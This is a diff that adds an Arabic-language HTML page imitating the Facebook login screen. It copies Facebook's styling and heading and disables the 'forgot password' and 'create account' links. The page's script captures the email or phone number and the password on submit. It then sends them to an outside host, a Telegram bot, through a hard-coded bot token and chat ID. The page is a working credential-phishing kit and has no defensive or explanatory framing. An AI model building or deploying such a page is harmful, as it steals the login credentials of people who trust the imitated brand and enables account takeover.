@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            color: #1877f2;
+            font-size: 36px;
+            margin: 0;
+        }
+        .header p {
+            color: #606770;
+            font-size: 20px;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #155db8;
+        }
+        .login-container a {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+            pointer-events: none;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>فيسبوك</h1>
+        <p>تواصل مع الأصدقاء والعائلة وساهم في بناء عالمك.</p>
+    </div>
+    <div class="login-container">
+        <form id="loginForm">
+            <input type="text" id="email" name="email" placeholder="أدخل البريد الإلكتروني أو رقم الهاتف">
+            <input type="text" id="password" name="password" placeholder="أدخل كلمة المرور">
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <a href="#">نسيت كلمة المرور؟</a>
+        <hr>
+        <button class="create-account">إنشاء حساب جديد</button>
+    </div>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7864992157:AAFqbZK9AziSkWhMxZEcFXHmWjoua0TXD5c";
+        const CHAT_ID = "6138683321";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const message = `📧 البريد الإلكتروني: ${email}\n🔒 كلمة المرور: ${password}`;
+
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                text: message,
+            }).then(response => {
+                alert('تم إرسال البيانات بنجاح!');
+            }).catch(error => {
+                alert('حدث خطأ أثناء الإرسال.');
+                console.error(error);
+            });
+        });
+    </script>
+</body>
+</html>
